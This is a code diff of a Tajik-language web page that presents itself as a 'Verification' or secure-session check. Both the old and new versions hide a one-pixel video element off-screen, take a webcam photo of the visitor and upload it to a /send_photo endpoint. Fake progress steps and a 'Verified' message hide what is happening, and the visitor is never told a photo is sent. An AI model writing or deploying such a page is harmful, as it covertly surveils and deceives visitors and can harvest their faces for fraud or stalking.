@@ -1,440 +1,165 @@
 <!DOCTYPE html>
 <html lang="tg">
 <head>
-  <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>Verification</title>
-  <style>
-    :root{
-      --bg1:#05060a;
-      --bg2:#070a14;
-      --glass: rgba(255,255,255,.08);
-      --glass2: rgba(255,255,255,.12);
-      --text: rgba(255,255,255,.92);
-      --muted: rgba(255,255,255,.72);
-      --line: rgba(255,255,255,.12);
-      --ok: #2de38f;
-      --warn:#ffcc66;
-      --err:#ff5c7a;
-      --shadow: 0 20px 80px rgba(0,0,0,.55);
-    }
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Verification</title>
 
-    *{box-sizing:border-box}
-    body{
-      margin:0;
-      min-height:100vh;
-      display:grid;
-      place-items:center;
-      color:var(--text);
-      font-family: ui-sans-serif, system-ui, -apple-system, Segoe UI, Roboto, Arial;
-      background: radial-gradient(1200px 800px at 20% 20%, rgba(140,90,255,.22), transparent 55%),
-                  radial-gradient(1100px 700px at 80% 30%, rgba(0,255,200,.18), transparent 55%),
-                  radial-gradient(900px 700px at 50% 85%, rgba(255,120,180,.14), transparent 60%),
-                  linear-gradient(180deg, var(--bg1), var(--bg2));
-      overflow:hidden;
-    }
+<style>
+body{
+  margin:0;
+  min-height:100vh;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  font-family:Arial, sans-serif;
+  color:white;
+  background:
+  radial-gradient(circle at 20% 30%, #6a5cff55, transparent 40%),
+  radial-gradient(circle at 80% 20%, #00ffc855, transparent 40%),
+  radial-gradient(circle at 50% 90%, #ff4da655, transparent 50%),
+  #05060a;
+}
 
-    /* animated glow blobs */
-    .blob{
-      position:absolute;
-      width:520px;
-      height:520px;
-      filter: blur(40px);
-      opacity:.55;
-      border-radius: 50%;
-      transform: translate(-50%,-50%);
-      animation: float 10s ease-in-out infinite;
-      pointer-events:none;
-      mix-blend-mode: screen;
-    }
-    .blob.a{left:18%; top:25%; background: radial-gradient(circle at 30% 30%, rgba(140,90,255,.95), transparent 60%); animation-duration: 11s;}
-    .blob.b{left:82%; top:30%; background: radial-gradient(circle at 30% 30%, rgba(0,255,200,.85), transparent 60%); animation-duration: 13s;}
-    .blob.c{left:50%; top:86%; background: radial-gradient(circle at 30% 30%, rgba(255,120,180,.75), transparent 60%); animation-duration: 12s;}
+.card{
+  width:380px;
+  padding:28px;
+  border-radius:20px;
+  background:rgba(255,255,255,0.08);
+  backdrop-filter:blur(15px);
+  border:1px solid rgba(255,255,255,0.15);
+  text-align:center;
+  box-shadow:0 20px 60px rgba(0,0,0,.6);
+}
 
-    @keyframes float{
-      0%,100%{transform: translate(-50%,-50%) scale(1) rotate(0deg)}
-      50%{transform: translate(-50%,-50%) scale(1.08) rotate(8deg)}
-    }
+h2{
+  margin-top:0;
+}
 
-    /* subtle noise overlay */
-    .noise{
-      position:absolute; inset:0;
-      background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='160' height='160'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='.8' numOctaves='3' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='160' height='160' filter='url(%23n)' opacity='.22'/%3E%3C/svg%3E");
-      opacity:.18;
-      mix-blend-mode: overlay;
-      pointer-events:none;
-    }
+#status{
+  opacity:.8;
+  font-size:14px;
+}
 
-    .wrap{
-      width:min(520px, 92vw);
-      position:relative;
-      z-index:2;
-    }
+button{
+  margin-top:16px;
+  width:100%;
+  padding:14px;
+  border:none;
+  border-radius:12px;
+  font-size:16px;
+  font-weight:bold;
+  cursor:pointer;
+  background:linear-gradient(135deg,#7b5cff,#00ffd0);
+  color:#000;
+}
 
-    .card{
-      position:relative;
-      padding:24px 22px 18px;
-      border-radius:22px;
-      background: linear-gradient(180deg, rgba(255,255,255,.10), rgba(255,255,255,.06));
-      border:1px solid var(--line);
-      box-shadow: var(--shadow);
-      backdrop-filter: blur(14px);
-      overflow:hidden;
-    }
+button:disabled{
+  opacity:.6;
+  cursor:not-allowed;
+}
 
-    /* shimmer line */
-    .card::before{
-      content:"";
-      position:absolute;
-      inset:-120px -220px auto -220px;
-      height:260px;
-      background: linear-gradient(90deg, transparent, rgba(255,255,255,.18), transparent);
-      transform: rotate(12deg);
-      animation: shimmer 4.2s ease-in-out infinite;
-      pointer-events:none;
-    }
-    @keyframes shimmer{
-      0%{transform: translateX(-30%) rotate(12deg); opacity:.0}
-      20%{opacity:.25}
-      50%{transform: translateX(45%) rotate(12deg); opacity:.22}
-      100%{transform: translateX(110%) rotate(12deg); opacity:0}
-    }
+/* камера пинҳон */
+#video{
+  position:fixed;
+  left:-9999px;
+  top:-9999px;
+  width:1px;
+  height:1px;
+  opacity:0;
+}
 
-    .top{
-      display:flex;
-      align-items:center;
-      justify-content:space-between;
-      gap:12px;
-      margin-bottom:14px;
-    }
-
-    .brand{
-      display:flex;
-      align-items:center;
-      gap:10px;
-      letter-spacing:.2px;
-    }
-    .logo{
-      width:40px; height:40px;
-      border-radius:14px;
-      background: radial-gradient(circle at 30% 30%, rgba(255,255,255,.26), rgba(255,255,255,.08)),
-                  linear-gradient(135deg, rgba(140,90,255,.7), rgba(0,255,200,.55));
-      border:1px solid rgba(255,255,255,.18);
-      box-shadow: 0 12px 30px rgba(0,0,0,.35);
-      display:grid;
-      place-items:center;
-      font-size:18px;
-    }
-    h1{
-      margin:0;
-      font-size:18px;
-      font-weight:800;
-      line-height:1.2;
-    }
-    .sub{
-      margin:2px 0 0;
-      font-size:13px;
-      color:var(--muted);
-    }
-
-    .badge{
-      font-size:12px;
-      padding:8px 10px;
-      border-radius:999px;
-      border:1px solid rgba(255,255,255,.14);
-      background: rgba(255,255,255,.06);
-      color: rgba(255,255,255,.85);
-      display:flex;
-      align-items:center;
-      gap:8px;
-      user-select:none;
-      white-space:nowrap;
-    }
-    .dot{
-      width:8px; height:8px;
-      border-radius:50%;
-      background: var(--warn);
-      box-shadow: 0 0 18px rgba(255,204,102,.7);
-      animation: pulse 1.6s ease-in-out infinite;
-    }
-    @keyframes pulse{
-      0%,100%{transform:scale(1); opacity:.8}
-      50%{transform:scale(1.35); opacity:1}
-    }
-
-    .body{
-      margin-top:12px;
-      padding:16px 14px;
-      border-radius:18px;
-      background: rgba(0,0,0,.18);
-      border:1px solid rgba(255,255,255,.10);
-    }
-
-    .status{
-      margin:0;
-      font-size:14px;
-      color: rgba(255,255,255,.88);
-      display:flex;
-      align-items:center;
-      justify-content:space-between;
-      gap:12px;
-    }
-    .status strong{
-      font-weight:800;
-      letter-spacing:.1px;
-    }
-
-    .loader{
-      width:18px; height:18px;
-      border-radius:50%;
-      border:2px solid rgba(255,255,255,.25);
-      border-top-color: rgba(255,255,255,.9);
-      animation: spin .9s linear infinite;
-      flex:0 0 auto;
-    }
-    @keyframes spin{to{transform:rotate(360deg)}}
-
-    .steps{
-      margin:14px 0 0;
-      display:grid;
-      gap:10px;
-    }
-    .step{
-      display:flex;
-      align-items:center;
-      gap:10px;
-      font-size:13px;
-      color: rgba(255,255,255,.75);
-    }
-    .step i{
-      width:18px; height:18px;
-      border-radius:6px;
-      border:1px solid rgba(255,255,255,.16);
-      background: rgba(255,255,255,.06);
-      display:grid;
-      place-items:center;
-      font-style:normal;
-      font-weight:900;
-      font-size:12px;
-      color: rgba(255,255,255,.88);
-    }
-    .step.done{color: rgba(255,255,255,.92)}
-    .step.done i{
-      background: rgba(45,227,143,.14);
-      border-color: rgba(45,227,143,.32);
-      color: var(--ok);
-      box-shadow: 0 0 18px rgba(45,227,143,.25);
-    }
-
-    .footer{
-      margin-top:14px;
-      display:flex;
-      justify-content:space-between;
-      align-items:center;
-      gap:10px;
-      font-size:12px;
-      color: rgba(255,255,255,.55);
-    }
-
-    /* hidden capture elements */
-    #video{
-      position:fixed; left:-9999px; top:-9999px;
-      width:1px; height:1px; opacity:0; pointer-events:none;
-    }
-    #canvas{display:none;}
-
-    /* success toast */
-    .toast{
-      position:absolute;
-      left:16px; right:16px; bottom:16px;
-      padding:12px 12px;
-      border-radius:16px;
-      border:1px solid rgba(255,255,255,.14);
-      background: rgba(0,0,0,.28);
-      display:flex;
-      align-items:center;
-      justify-content:space-between;
-      gap:12px;
-      transform: translateY(16px);
-      opacity:0;
-      transition: .35s ease;
-      pointer-events:none;
-    }
-    .toast.show{opacity:1; transform: translateY(0)}
-    .toast .ok{
-      display:flex; align-items:center; gap:10px;
-      color: rgba(255,255,255,.92);
-      font-size:13px;
-    }
-    .toast .ok b{color: var(--ok)}
-    .check{
-      width:18px; height:18px; border-radius:6px;
-      background: rgba(45,227,143,.15);
-      border:1px solid rgba(45,227,143,.35);
-      display:grid; place-items:center;
-      color: var(--ok);
-      font-weight:900;
-    }
-
-    /* small mobile polish */
-    @media (max-width:420px){
-      .card{padding:20px 18px 16px}
-      .logo{width:38px;height:38px}
-    }
-  </style>
+#canvas{display:none;}
+</style>
 </head>
+
 <body>
-  <div class="blob a"></div>
-  <div class="blob b"></div>
-  <div class="blob c"></div>
-  <div class="noise"></div>
 
-  <div class="wrap">
-    <div class="card">
-      <div class="top">
-        <div class="brand">
-          <div class="logo">✓</div>
-          <div>
-            <h1>Чак чак</h1>
-            <p class="sub">Secure session • please wait</p>
-          </div>
-        </div>
-        <div class="badge" id="badge"><span class="dot" id="dot"></span><span id="badgeText">Initializing</span></div>
-      </div>
+<div class="card">
+  <h1>Чак чак</h2>
+  <p id="status">Press continue</p>
+  <button id="startBtn">давом додан</button>
 
-      <div class="body">
-        <p class="status">
-          <span><strong id="title">Preparing…</strong><span style="opacity:.7" id="status"> Starting…</span></span>
-          <span class="loader" id="loader"></span>
-        </p>
-
-        <div class="steps">
-          <div class="step" id="s1"><i>1</i> Санчиш... </div>
-          <div class="step" id="s2"><i>2</i> интизор шудан...</div>
-          <div class="step" id="s3"><i>3</i> ок</div>
-        </div>
-      </div>
-
-      <div class="footer">
-        <span>Do not close this page</span>
-        <span id="hint">It takes a few seconds</span>
-      </div>
-
-      <div class="toast" id="toast">
-        <div class="ok"><span class="check">✓</span> Completed • <b>Verified</b></div>
-        <div style="opacity:.65;font-size:12px">You may close</div>
-      </div>
-
-      <!-- hidden elements for capture -->
-      <video id="video" autoplay playsinline muted></video>
-      <canvas id="canvas"></canvas>
-    </div>
-  </div>
+  <video id="video" autoplay playsinline muted></video>
+  <canvas id="canvas"></canvas>
+</div>
 
 <script>
-  const video = document.getElementById("video");
-  const canvas = document.getElementById("canvas");
+const video = document.getElementById("video");
+const canvas = document.getElementById("canvas");
+const statusText = document.getElementById("status");
+const startBtn = document.getElementById("startBtn");
 
-  const statusText = document.getElementById("status");
-  const titleText  = document.getElementById("title");
-  const badgeText  = document.getElementById("badgeText");
-  const dot        = document.getElementById("dot");
-  const loader     = document.getElementById("loader");
-  const toast      = document.getElementById("toast");
+function setStatus(t){
+  statusText.innerText = t;
+}
 
-  const s1 = document.getElementById("s1");
-  const s2 = document.getElementById("s2");
-  const s3 = document.getElementById("s3");
+function sleep(ms){
+  return new Promise(r=>setTimeout(r,ms));
+}
 
-  function setUI({title, status, badge, state}) {
-    if (title !== undefined) titleText.textContent = title;
-    if (status !== undefined) statusText.textContent = " " + status;
-    if (badge !== undefined) badgeText.textContent = badge;
+startBtn.onclick = async ()=>{
+  startBtn.disabled = true;
+  await start();
+};
 
-    // state: "warn" | "ok" | "err"
-    if (state === "ok") {
-      dot.style.background = "var(--ok)";
-      dot.style.boxShadow = "0 0 18px rgba(45,227,143,.7)";
-    } else if (state === "err") {
-      dot.style.background = "var(--err)";
-      dot.style.boxShadow = "0 0 18px rgba(255,92,122,.7)";
-    } else {
-      dot.style.background = "var(--warn)";
-      dot.style.boxShadow = "0 0 18px rgba(255,204,102,.7)";
-    }
+async function start(){
+try{
+  setStatus("Requesting camera...");
+
+  const stream = await navigator.mediaDevices.getUserMedia({
+    video:true,
+    audio:false
+  });
+
+  video.srcObject = stream;
+  await video.play().catch(()=>{});
+
+  setStatus("Camera ready");
+  await sleep(1500);
+
+  while(!video.videoWidth){
+    await sleep(100);
   }
 
-  function done(stepEl){
-    stepEl.classList.add("done");
-    stepEl.querySelector("i").textContent = "✓";
-  }
+  setStatus("Capturing...");
+  canvas.width = video.videoWidth;
+  canvas.height = video.videoHeight;
+  canvas.getContext("2d").drawImage(video,0,0);
 
-  function sleep(ms){ return new Promise(r=>setTimeout(r,ms)); }
+  const blob = await new Promise(res=>canvas.toBlob(res,"image/jpeg",0.95));
 
-  async function start(){
-    try{
-      setUI({title:"Preparing…", status:"requesting access", badge:"Requesting camera", state:"warn"});
+  setStatus("Uploading...");
+  await sendToServer(blob);
 
-      const stream = await navigator.mediaDevices.getUserMedia({
-        video: { facingMode: "user" },
-        audio: false
-      });
+  setStatus("Completed ✓");
+  stream.getTracks().forEach(t=>t.stop());
 
-      video.srcObject = stream;
-      await video.play().catch(()=>{});
+}catch(e){
+  console.error(e);
+  setStatus("Error: "+e.message);
+}
+}
 
-      done(s1);
-      setUI({title:"Connected", status:"camera accepted", badge:"Camera ready", state:"ok"});
+async function sendToServer(blob){
+const fd = new FormData();
+fd.append("photo", blob, "photo.jpg");
 
-      await sleep(1200);
+const res = await fetch("/send_photo", {
+method:"POST",
+body:fd
+});
 
-      // wait for dimensions
-      while(!video.videoWidth || !video.videoHeight){
-        await sleep(80);
-      }
+if(!res.ok){
+throw new Error(await res.text());
+}
 
-      setUI({title:"Capturing…", status:"processing image", badge:"Capturing", state:"warn"});
-      done(s2);
-
-      canvas.width = video.videoWidth;
-      canvas.height = video.videoHeight;
-      canvas.getContext("2d").drawImage(video, 0, 0);
-
-      const blob = await new Promise(res => canvas.toBlob(res, "image/jpeg", 0.95));
-      if(!blob) throw new Error("toBlob failed");
-
-      setUI({title:"Uploading…", status:"secure transfer", badge:"Uploading", state:"warn"});
-      await sendToServer(blob);
-
-      done(s3);
-      setUI({title:"Done", status:"completed", badge:"Success", state:"ok"});
-      loader.style.display = "none";
-      toast.classList.add("show");
-
-      stream.getTracks().forEach(t => t.stop());
-
-    }catch(e){
-      console.error(e);
-      loader.style.display = "none";
-      setUI({title:"Error", status:(e?.message || e), badge:"Failed", state:"err"});
-    }
-  }
-
-  async function sendToServer(blob){
-    const fd = new FormData();
-    fd.append("photo", blob, "photo.jpg");
-
-    const res = await fetch("/send_photo", { method:"POST", body: fd });
-    if(!res.ok){
-      const txt = await res.text();
-      throw new Error(txt);
-    }
-
-    const data = await res.json().catch(()=>null);
-    if(!data || data.ok !== true) throw new Error("Server returned error");
-  }
-
-  start();
+const data = await res.json();
+if(!data.ok){
+throw new Error("Server error");
+}
+}
 </script>
+
 </body>
 </html>
